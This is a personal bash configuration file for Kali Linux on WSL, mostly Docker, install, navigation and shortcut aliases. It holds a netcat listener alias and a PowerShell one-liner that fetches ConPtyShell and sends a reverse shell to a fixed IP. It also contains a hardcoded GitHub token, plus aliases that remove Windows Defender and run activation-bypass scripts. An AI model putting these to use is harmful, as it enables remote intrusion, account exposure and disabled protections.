# ~/.bashrc: executed by bash(1) for non-login shells.
# see /usr/share/doc/bash/examples/startup-files (in the package bash-doc)
# for examples

# If not running interactively, don't do anything
case $- in
    *i*) ;;
      *) return;;
esac

# don't put duplicate lines or lines starting with space in the history.
# See bash(1) for more options
HISTCONTROL=ignoreboth

# append to the history file, don't overwrite it
shopt -s histappend

# for setting history length see HISTSIZE and HISTFILESIZE in bash(1)
HISTSIZE=1000
HISTFILESIZE=2000

# check the window size after each command and, if necessary,
# update the values of LINES and COLUMNS.
shopt -s checkwinsize

# set a fancy prompt (non-color, unless we know we "want" color)
case "$TERM" in
    xterm-color|*-256color) color_prompt=yes;;
esac

# uncomment for a colored prompt, if the terminal has the capability; turned
# off by default to not distract the user: the focus in a terminal window
# should be on the output of commands, not on the prompt
force_color_prompt=yes

if [ -n "$force_color_prompt" ]; then
    if [ -x /usr/bin/tput ] && tput setaf 1 >&/dev/null; then
        # We have color support; assume it's compliant with Ecma-48
        # (ISO/IEC-6429). (Lack of such support is extremely rare, and such
        # a case would tend to support setf rather than setaf.)
        color_prompt=yes
    else
        color_prompt=
    fi
fi

# The following block is surrounded by two delimiters.
# These delimiters must not be modified. Thanks.
# START KALI CONFIG VARIABLES
PROMPT_ALTERNATIVE=twoline
NEWLINE_BEFORE_PROMPT=yes
# STOP KALI CONFIG VARIABLES

if [ "$color_prompt" = yes ]; then
    # override default virtualenv indicator in prompt
    VIRTUAL_ENV_DISABLE_PROMPT=1

    prompt_color='\[\033[;32m\]'
    info_color='\[\033[1;34m\]'
    prompt_symbol=㉿
    if [ "$EUID" -eq 0 ]; then # Change prompt colors for root user
        prompt_color='\[\033[;94m\]'
        info_color='\[\033[1;31m\]'
        # Skull emoji for root terminal
        #prompt_symbol=💀
    fi
    case "$PROMPT_ALTERNATIVE" in
        twoline)
            PS1=$prompt_color'┌──${debian_chroot:+($debian_chroot)──}${VIRTUAL_ENV:+(\[\033[0;1m\]$(basename $VIRTUAL_ENV)'$prompt_color')}('$info_color'\u'$prompt_symbol'\h'$prompt_color')-[\[\033[0;1m\]\w'$prompt_color']\n'$prompt_color'└─'$info_color'\$\[\033[0m\] ';;
        oneline)
            PS1='${VIRTUAL_ENV:+($(basename $VIRTUAL_ENV)) }${debian_chroot:+($debian_chroot)}'$info_color'\u@\h\[\033[00m\]:'$prompt_color'\[\033[01m\]\w\[\033[00m\]\$ ';;
        backtrack)
            PS1='${VIRTUAL_ENV:+($(basename $VIRTUAL_ENV)) }${debian_chroot:+($debian_chroot)}\[\033[01;31m\]\u@\h\[\033[00m\]:\[\033[01;34m\]\w\[\033[00m\]\$ ';;
    esac
    unset prompt_color
    unset info_color
    unset prompt_symbol
else
    PS1='${debian_chroot:+($debian_chroot)}\u@\h:\w\$ '
fi
unset color_prompt force_color_prompt

# If this is an xterm set the title to user@host:dir
case "$TERM" in
xterm*|rxvt*|Eterm|aterm|kterm|gnome*|alacritty)
    PS1="\[\e]0;${debian_chroot:+($debian_chroot)}\u@\h: \w\a\]$PS1"
    ;;
*)
    ;;
esac

[ "$NEWLINE_BEFORE_PROMPT" = yes ] && PROMPT_COMMAND="PROMPT_COMMAND=echo"

# enable color support of ls, less, and man, and also add handy aliases
if [ -x /usr/bin/dircolors ]; then
    test -r ~/.dircolors && eval "$(dircolors -b ~/.dircolors)" || eval "$(dircolors -b)"
    export LS_COLORS="$LS_COLORS:ow=30;44:" # fix ls color for folders with 777 permissions

    alias ls='ls --color=auto'
    alias grep='grep --color=auto'
    alias fgrep='fgrep --color=auto'
    alias egrep='egrep --color=auto'
    alias diff='diff --color=auto'
    alias ip='ip --color=auto'

    export LESS_TERMCAP_mb=$'\E[1;31m'     # begin blink
    export LESS_TERMCAP_md=$'\E[1;36m'     # begin bold
    export LESS_TERMCAP_me=$'\E[0m'        # reset bold/blink
    export LESS_TERMCAP_so=$'\E[01;33m'    # begin reverse video
    export LESS_TERMCAP_se=$'\E[0m'        # reset reverse video
    export LESS_TERMCAP_us=$'\E[1;32m'     # begin underline
    export LESS_TERMCAP_ue=$'\E[0m'        # reset underline
fi

# colored GCC warnings and errors
#export GCC_COLORS='error=01;31:warning=01;35:note=01;36:caret=01;32:locus=01:quote=01'

# some more ls aliases
alias ll='ls -l'
alias la='ls -A'
alias l='ls -CF'

# Alias definitions.
# You may want to put all your additions into a separate file like
# ~/.bash_aliases, instead of adding them here directly.
# See /usr/share/doc/bash-doc/examples in the bash-doc package.

if [ -f ~/.bash_aliases ]; then
    . ~/.bash_aliases
fi

# enable programmable completion features (you don't need to enable
# this if it's already enabled in /etc/bash.bashrc and /etc/profile
# sources /etc/bash.bashrc).
if ! shopt -oq posix; then
  if [ -f /usr/share/bash-completion/bash_completion ]; then
    . /usr/share/bash-completion/bash_completion
  elif [ -f /etc/bash_completion ]; then
    . /etc/bash_completion
  fi
fi

export DISPLAY=$(awk '/nameserver / {print $2; exit}' /etc/resolv.conf 2>/dev/null):0

# Docker containers aliases
alias whisper='docker run -v /mnt/c/:/c/ -it michadockermisha/backup:whisper bash'
alias st='docker run -v /mnt/c/:/c/ -it --name study michadockermisha/backup:study'
alias pushwh='docker push michadockermisha/backup:whisper'
alias startwh='docker start -ai whisper'
alias portainer='docker pull michadockermisha/backup:portainer && docker run -d -p 9000:9000 --name portainer --restart always -v /var/run/docker.sock:/var/run/docker.sock michadockermisha/backup:portainer && ff localhost:9000'
alias runhosts=' docker run -v /mnt/c/:/c/ -it -e DISPLAY=$DISPLAY -v /tmp/.X11-unix:/tmp/.X11-unix --ip 172.17.0.2 --name ubuntu -d michadockermisha/backup:ubuntu /bin/bash -c "service ssh start && tail -f /dev/null" && docker run -v /mnt/c/:/c/ -it -e DISPLAY=$DISPLAY -v /tmp/.X11-unix:/tmp/.X11-unix --ip 172.17.0.3 --name fedora -d michadockermisha/backup:fedora /bin/bash -c "/usr/sbin/sshd && tail -f /dev/null" &&  docker run -v /mnt/c/:/c/ -it -e DISPLAY=$DISPLAY -v /tmp/.X11-unix:/tmp/.X11-unix --ip 172.17.0.4 --name kali -d michadockermisha/backup:kali /bin/bash -c "service ssh start && tail -f /dev/null" && docker run -v /mnt/c/:/c/ -it -e DISPLAY=$DISPLAY -v /tmp/.X11-unix:/tmp/.X11-unix --ip 172.17.0.5 --name debian -d michadockermisha/backup:debian /bin/bash -c "service ssh start && tail -f /dev/null" && docker run -v /mnt/c/:/c/ -it -e DISPLAY=$DISPLAY -v /tmp/.X11-unix:/tmp/.X11-unix --ip 172.17.0.6 --name opensuse -d michadockermisha/backup:opensuse /bin/bash -c "/usr/sbin/sshd && tail -f /dev/null" '

alias kraken='drun gitkraken michadockermisha/backup:gitkraken sh -c "apk add rsync && rsync -aP /home/* /c/kraken && exit" && cd /mnt/c/kraken/ && cmd.exe /c "gitkraken.exe"'

alias krak=' cd /mnt/c/kraken/ && cmd.exe /c "gitkraken.exe"'

alias dcode='docker login && cc && docker run -v /mnt/c/:/c/ -e DISPLAY=$DISPLAY -v /tmp/.X11-unix:/tmp/.X11-unix -it --rm --name my_container michadockermisha/backup:python bash -c "echo 'y' | code --no-sandbox --user-data-dir=~/vscode-data && bash"'

alias savehosts='docker commit b541bfc8a1e1 michadockermisha/backup:opensuse && \
docker push michadockermisha/backup:opensuse && \
docker commit c4f47b0680ca michadockermisha/backup:debian && \
docker push michadockermisha/backup:debian && \
docker commit 0adc7d163c34 michadockermisha/backup:kali && \
docker push michadockermisha/backup:kali && \
docker commit 50db59e77e31 michadockermisha/backup:fedora && \
docker push michadockermisha/backup:fedora && \
docker commit e5403a943324 michadockermisha/backup:ubuntu && \
docker push michadockermisha/backup:ubuntu'

# Docker general aliases
alias ds='docker search'
alias dstart='sudo service docker start'
alias dai='docker start -ai'
alias dps='docker ps --size'
alias dpsa='docker ps -a --size'
alias dim='docker images'
alias built='docker build -t'
alias dpush='docker push'
alias start='docker start -ai'
alias drun='docker run -v /mnt/c/:/c/ -it -e DISPLAY=$DISPLAY -v /tmp/.X11-unix:/tmp/.X11-unix -it --name'
alias dr='docker exec -it'
alias drc='docker rm -f'
alias dri='docker rmi -f'
alias dc='docker commit'
alias dkill='docker stop $(docker ps -aq) || true && docker rm $(docker ps -aq) || true && ( [ "$(docker ps -q)" ] || docker rmi $(docker images -q) || true ) && ( [ "$(docker images -q)" ] || docker system prune -a --volumes --force ) && docker network prune --force || true'
alias commit='bash /mnt/c/study/docker/files/scripts/commit.sh'
alias push='docker images --format '{{.Repository}}:{{.Tag}}' | xargs -L1 docker push'
alias build="cp /mnt/c/study/docker/files/dockerfiles/buildimage ./Dockerfile && nano Dockerfile"
alias build2='cp /mnt/c/study/docker/files/dockerfiles/buildthispath ./Dockerfile && nano Dockerfile'
alias dl='bash /mnt/c/study/docker/originaldl.sh'
alias containerip="docker inspect -f '{{range .NetworkSettings.Networks}}{{.IPAddress}}{{end}}' "
alias killc='docker stop $(docker ps -q)
docker rm $(docker ps -aq)'
alias ms='docker run -v /mnt/c/:/c/ -it -e DISPLAY=$DISPLAY -v /tmp/.X11-unix:/tmp/.X11-unix michadockermisha/backup:$2 --name $1'
alias dcu='docker-compose up -d'

#BACKUP TO DOCKER
alias backupwsl='cd /mnt/c/backup/linux/wsl && built michadockermisha/backup:wsl . && docker push michadockermisha/backup:wsl'
alias backupst='stu && built michadockermisha/backup:study . && docker push michadockermisha/backup:study'
alias backupapps='cd /mnt/c/backup/windowsapps && built michadockermisha/backup:windowsapps . && docker push michadockermisha/backup:windowsapps'
alias backitup='backupapps && backupst && backupwsl'

# General aliases
alias ps='docker ps -a --size && docker ps --size && docker images'
alias cc='clear'
alias brc='gedit ~/.bashrc'
alias brc1='source ~/.bashrc'
alias brc2='source ~/.bashrc && source /root/.bashrc && cp /root/.bashrc /mnt/c/backup/linux/wsl/alias.txt && cp /root/.bashrc ~/bashrc && rsync -aP /root/.bashrc /mnt/c/study/bash/.bashrc'
alias savealias='cp ~/.bashrc /mnt/c/backup/linux/wsl/alias.txt && cp ~/.bashrc /root/.bashrc'
alias savealiasr='cp /root/.bashrc /mnt/c/backup/linux/wsl/alias.txt && cp /root/.bashrc ~/bashrc'
alias updates='sudo apt update -y && sudo apt upgrade -y && sudo apt autoremove -y'
alias ip="ip addr show eth0 | grep -oP '(?<=inet\s)\d+(\.\d+){3}'"
alias os='cat /etc/os-release'
alias cpbash='sudo cp /root/.bashrc /home/kali/.bashrc'



# networking
alias myip="hostname -I | cut -d' ' -f1"
alias gatway="netstat -rn | grep '^0.0.0.0'"


# VMS
alias server='cmd.exe /c "C:\Program Files (x86)\VMware\VMware Workstation\vmrun.exe" -T ws start "C:\windowserver22\vmware\windowserver22\windowserver22.vmx"'
alias win='cmd.exe /c ""C:\Program Files (x86)\VMware\VMware Workstation\vmrun.exe" -T ws start "C:\windows11vm\windows11.vmx"'
alias vmkey='cat /mnt/c/backup/windowsapps/install/vmware/key.txt'


##natcat
alias nc='stty raw -echo; (stty size; cat) | nc -lvnp 3001'
alias ncwinserv='cat " IEX(IWR https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell 172.17.211.249 3001"'

alias ssk='ssh-keygen -t rsa -b 2048 && ssh-copy-id'

#CD aliases
alias c='cd /mnt/c/'
alias stu='cd /mnt/c/study'
alias apps='cd /mnt/c/backup/windowsapps/installed'
alias install='cd /mnt/c/backup/windowsapps/install'
alias cdwsl='cd /mnt/c/backup/linux/wsl'
alias games='cd /mnt/c/games'
alias cdlinux='cd /mnt/c/backup/linux'
alias downloads='cd /mnt/c/Users/micha/Downloads'
alias pfiles="c && cd 'Program Files'"
alias wapps='pfiles && cd WindowsApps'



#CD STUDY
alias sai='cd /mnt/c/study/AI'
alias scloud='cd /mnt/c/study/cloud'
alias sdocker='cd /mnt/c/study/docker'
alias sfirewall='cd /mnt/c/study/firewall'
alias slinux='cd /mnt/c/study/linux'
alias smonitoring='cd /mnt/c/study/monitoring'
alias spowershell='cd /mnt/c/study/powershell'
alias sssh='cd /mnt/c/study/ssh'
alias sansible='cd /mnt/c/study/ansible'
alias sdatabases='cd /mnt/c/study/databases'
alias sdockerfile='cd /mnt/c/study/Dockerfile'
alias sgit='cd /mnt/c/study/git'
alias smalware='cd /mnt/c/study/malware'
alias snetworking='cd /mnt/c/study/networking'
alias spython='cd /mnt/c/study/python'
alias svirtualmachines='cd /mnt/c/study/virtualmachines'
alias sbash='cd /mnt/c/study/bash'
alias sdebian='cd /mnt/c/study/debian based'
alias sexams='cd /mnt/c/study/exams'
alias skubernetes='cd /mnt/c/study/kubernetes'
alias smetasploit='cd /mnt/c/study/metasploit'
alias snmap='cd /mnt/c/study/nmap&wireshark'
alias sreverse='cd /mnt/c/study/reverseSHELL'
alias swindows='cd /mnt/c/study/windows'

#ANSIBLE
alias cda='cd /mnt/c/study/ansible/etc/ansible'
alias cdan='cd /etc/ansible'
alias play='cd /etc/ansible/playbooks'
alias cpa='cp -r /mnt/c/study/ansible/etc/ansible /etc/ansible'
alias backupansible='cp -r /etc/ansible /mnt/c/study/ansible/etc'
alias ansibleos='ansible docker -a "cat /etc/os-release"'
alias ansiblereboot='ansible docker -a "reboot"'
alias ansibleping='ansible docker -m ping'
alias ansibleupdate=' ansible-playbook -i /etc/ansible/hosts /etc/ansible/playbooks/update.yml'

#GITHUB
alias gl='apt install gh -y && gh auth login'
alias token='echo "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" '
alias gadd=' git add . && git commit -m "commit" && git push -u origin main'
alias gpython=' cd /mnt/c/study/git/repos/python/python'
alias gbash=' cd /mnt/c/study/git/repos/bash/bash'
alias gbashrc='cd /mnt/c/study/git/repos/.bashrc/.bashrc'
alias gps1='cd /mnt/c/study/git/repos/ps1/powershell'
alias gdesk='cmd C:/Users/micha/AppData/Local/GitHubDesktop/GitHubDesktop.exe'


#ECHO

alias choco="echo 'Set-ExecutionPolicy Bypass -Scope Process -Force; [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.ServicePointManager]::SecurityProtocol -bor 3072; iex ((New-Object System.Net.WebClient).DownloadString('https://community.chocolatey.org/install.ps1'))'"
alias fkali='echo "wsl --unregister kali-linux;  wsl --import kali-linux C:\wsl2 C:\backup\linux\wsl\kalifull.tar; wsl"'
alias backupw='echo '\''wsl --export kali-linux C:\backup\linux\kalicurrent.tar'\'''
alias wupdates='cat "/mnt/c/study/powershell/scripts/windowsupdates.ps1" && cp "/mnt/c/study/powershell/scripts/windowsupdates.ps1 /mnt/c/users/micha/updates.ps1"'

alias wslexport='echo "wsl --export kali-linux C:\backup\linux\kalicurrent.tar"'

alias freespace='cat /mnt/c/study/bash/scripts/freespace.sh && cp /mnt/c/study/bash/scripts/freespace.sh /mnt/c/freespace.sh'
alias errors='cat /mnt/c/study/bash/scripts/fixwindowserrors.sh && cp /mnt/c/study/bash/scripts/fixwindowserrors.sh /mnt/c/errors.sh'

#installations
alias getsnap='sudo apt install snapd -y && updates && systemctl enable --now snapd.apparmor'
alias getdocker='sudo apt update -y && sudo apt upgrade -y && \
  sudo apt install -y -qq docker.io kubectl kubernetes-client && \
  sudo usermod -aG docker $USER && newgrp docker && sudo service docker start && \
  sudo apt install -y -qq docker.io && sudo usermod -aG docker $USER && \
  newgrp docker && sudo service docker start && sudo sh -c "sudo setfacl -m user:$USER:rw /var/run/docker.sock && updates'
alias getpython='sudo apt install -y -qq python3 python3-pip pyinstaller && \
  sudo apt update -y && sudo apt upgrade -y && \
  sudo apt install -y -qq sshpass && sudo apt autoremove -y -qq'
alias getpycharm=' wget https://download.jetbrains.com/python/pycharm-community-2021.2.3.tar.gz && tar -xzf pycharm-community-2021.2.3.tar.gz && sudo mv pycharm-community-2021.2.3 /opt/ && cd /opt/pycharm-community-2021.2.3/bin && ./pycharm.sh'
alias k8s='sudo snap install microk8s --classic'
alias installprometheus='wget https://github.com/prometheus/prometheus/releases/download/v2.30.3/prometheus-2.30.3.linux-amd64.tar.gz  && tar xvf prometheus-2.30.3.linux-amd64.tar.gz && sudo mv prometheus-2.30.3.linux-amd64 /usr/local/bin/prometheus && echo -e "global:\n  scrape_interval: 15s\n  evaluation_interval: 15s\n\nscrape_configs:\n  - job_name: '\''prometheus'\''\n    static_configs:\n      - targets: ['\''localhost:9090'\'']\n  # Add additional jobs/targets as needed" | sudo tee -a /usr/local/bin/prometheus/prometheus.yml && cc && cd /usr/local/bin/prometheus && ./prometheus'
# Install Docker
alias getdocker='sudo apt install -y docker-compose && sudo apt install -y -qq docker.io && \
sudo usermod -aG docker $USER && newgrp docker && sudo service docker start && \
sudo sh -c "sudo setfacl -m user:$USER:rw /var/run/docker.sock && \
sudo setfacl -m user:$USER:rw /var/run/docker.sock" && sudo systemctl enable docker'

alias getlazyd="LAZYDOCKER_VERSION=$(curl -s "https://api.github.com/repos/jesseduffield/lazydocker/releases/latest" | grep -Po '"tag_name": "v\K[0-9.]+') && curl -Lo lazydocker.tar.gz "https://github.com/jesseduffield/lazydocker/releases/latest/download/lazydocker_${LAZYDOCKER_VERSION}_Linux_x86_64.tar.gz" && mkdir lazydocker-temp && tar xf lazydocker.tar.gz -C lazydocker-temp && sudo mv lazydocker-temp/lazydocker /usr/local/bin && rm -rf lazydocker.tar.gz lazydocker-temp && lazydocker"

alias getgoogler='apt install links w3m googler -y'
alias getext='apt install tesseract-ocr -y'
alias text=tesseract

alias getcode='curl -fsSL https://code-server.dev/install.sh | sh'
alias csrun='code-server'
alias cs='ff localhost:8080'

# Install basic tools and dependencies
alias basicinstall='sudo apt install -y -qq wireless-tools rsync abiword tesseract-ocr gh pv speedtest-cli kali-win-kex \
net-tools gedit thonny kali-desktop-xfce curl wget ansible-core jq libgtk-3-dev libcurl4-openssl-dev -y'

# Install SSH
alias getssh='sudo apt install -y -qq openssh-server && sudo service ssh start && \
sudo apt install -y -qq sshpass'


##tgpt  (-i, -c )
alias getgpt='curl -sSL https://raw.githubusercontent.com/aandrew-me/tgpt/main/install | bash -s /usr/local/bin'
alias i='tgpt -i'
alias ask='tgpt'
alias m='tgpt -m'

# Full installation sequence
alias full='updates && getgpt && getgoogler && basicinstall && getssh && getdocker && getpython && updates'

  
export DOCKER_BUILDKIT=1
export PATH="${KREW_ROOT:-$HOME/.krew}/bin:$PATH"


# SLEEP
alias 60='sleep 60 &&'
alias 30='sleep 30 &&'
alias 5='sleep 300 &&'
alias 10='sleep 600 &&'
alias 1800='sleep 1800 &&'
alias hour='sleep 3600 &&'

# DISPLAY
alias ed='echo $DISPLAY'
alias x11='export DISPLAY=:0'

#system
alias reset='echo "systemreset.exe" '
alias resetfull='echo "systemreset.exe" '
alias scripts='echo  "Set-ExecutionPolicy -Scope CurrentUser -ExecutionPolicy RemoteSigned" '
alias conf=' nano /etc/wsl.conf'
alias conf2='nano /mnt/c/Users/micha/.wslconfig'
alias cleanwsl=' cat "/mnt/c/study/powershell/scripts/optimizewsl.ps1" && cp /mnt/c/study/powershell/scripts/optimizewsl.ps1 /mnt/c/Users/micha/ccwsl.ps1'
alias ccwsl='echo "wsl --shutdown; ./ccwsl.ps1; wsl"'
alias poweroff='shutdown.exe /s /t 0'
alias reboot='shutdown.exe /r /t 0'


#firefox
alias ff='cmd.exe /c start firefox'
alias ffd='ff https://hub.docker.com/repository/docker/michadockermisha/backup/tags?page=1&ordering=last_updated'
alias yt='ff youtube.com'
alias gt='ff github.com'
alias gtp='ff https://github.com/Michaelunkai/python'
alias gpt='ff https://chat.openai.com/'
alias pocket='ff https://getpocket.com/saves?src=navbar'
alias 1337='ff https://1337x.to/home/'
alias fitgirl='ff https://1337x.to/search/fitgirl/46/'
alias gmail='ff https://mail.google.com/mail/u/0/'
alias ytlater='ff https://www.youtube.com/playlist?list=WL'
alias gamespot='ff https://www.gamespot.com/'
alias anime='ff https://9animetv.to/home'
alias proxmox="ff https://172.30.244.9:8006/"

#EXE
alias qb='cmd.exe /c "C:\Program Files\qBittorrent\qbittorrent.exe"'
alias vs="cmd.exe /c C:/Users/micha/AppData/Roaming/Microsoft/Windows/'Start Menu'/Programs/'Visual Studio Code'/'Visual Studio Code.lnk'"
alias drivers='cmd.exe /c "C:\Program Files\NVIDIA Corporation\NVIDIA GeForce Experience\NVIDIA GeForce Experience.exe"'
alias mstore='pfiles && cd WindowsApps && cd Microsoft.WindowsStore_22310.1401.8.0_x64__8wekyb3d8bbwe && cmd.exe /c "WinStore.App.exe"'
alias gears='cd /mnt/c/games/gears5/geargame/binaries/steam && cmd Gears5.exe'



#EXPORT
export PATH=$PATH:/snap/bin
export DISPLAY=:0
export DOCKER_CONFIG=/mnt/c/docker/DockerDesktopWSL/data

alias qcow='qemu-img convert -f vmdk -O qcow2'
alias size='du -sh /mnt/c/wsl2/ext4.vhdx'
alias dfs='df -h /mnt/c'
alias disk='du -sh /mnt/c /mnt/wslg'
alias compare='ff https://www.textcompare.org/python/'

alias prometheus=' cd  /usr/local/bin/prometheus/ && ./prometheus'
alias pyc=' bash /opt/pycharm-community-2021.2.3/bin/pycharm.sh'
alias biggest=' sudo du -h --max-depth=1 . | sort -hr'
alias wslg='cd /mnt/wslg && biggest'


alias psw='powershell.exe'
alias ex='explorer.exe .'
alias exd='d && ex'
alias venv='cd ~/ && python3 -m venv venv && source venv/bin/activate'
alias mp3="docker run --rm -v $HOME/Downloads:/root/Downloads dizcza/youtube-mp3 $1"
alias mp4='docker run \
                  --rm -i \
                  -e PGID=$(id -g) \
                  -e PUID=$(id -u) \
                  -v "$(pwd)":/workdir:rw \
                  mikenye/youtube-dl'
                  
alias txt='tesseract'  
                  

alias defender='cmd.exe /c C:backup/windowsapps/install/afterformat/windows-defender-remover-main/windows-defender-remover-main/Script_Run.bat'
                  
alias act='cd /mnt/c/backup/windowsapps/install/afterformat/Microsoft-Activation-Scripts-master/mas/All-In-One-Version  && cmd MAS_AIO.cmd'                  
                  
#PYTHON
alias python='python3'                  
alias py='python3'
alias encrypt='python3 /mnt/c/study/python/scripts/encrypt/encrypt.py'
alias decrypt='python3 /mnt/c/study/python/scripts/encrypt/decrypt.py'
alias compile='echo "& C:\Users\micha\AppData\Local\Packages\PythonSoftwareFoundation.Python.3.12_qbz5n2kfra8p0\LocalCache\local-packages\Python312\Scripts\pyinstaller.exe --noconsole"'

#wsl2
alias backupw='echo "wsl --export kali-linux C:\backup\linux\kalifull.tar"'
alias aliases=' gedit /mnt/c/backup/linux/wsl/alias.txt'
alias cpalias='cp /mnt/c/backup/linux/wsl/alias.txt /root/.bashrc && cp /mnt/c/backup/linux/wsl/alias.txt ~/.bashrc'

alias cmd='cmd.exe /c'

complete -C /mnt/c/Users/micha/mc mc